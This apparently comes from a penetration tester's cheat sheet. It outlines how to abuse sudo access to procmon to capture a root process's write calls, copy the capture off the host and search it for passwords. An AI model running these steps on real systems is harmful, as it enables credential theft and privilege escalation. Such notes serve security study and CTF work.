# Procmon Privilege Escalation

### Main usage: Read root processes that they may contain sensitive data like passwords, etc.

### STEPS:

 - ps aux | grep TARGET_SCRIPT.sh (Fetch the PID of the target process)

 - sudo /usr/bin/procmon -p PID -c output.db -e write (Write output in a .db file)

 - Transfer the file to our machine

 - sqlitebrowser output.db (Open the .db file with a db browser or similar)

 - Go to -> Browse Data -> Duration (Filter > 9000000 or similar)

 - Check the blobs 1 by 1. Here we can reveal potential sensitive data.
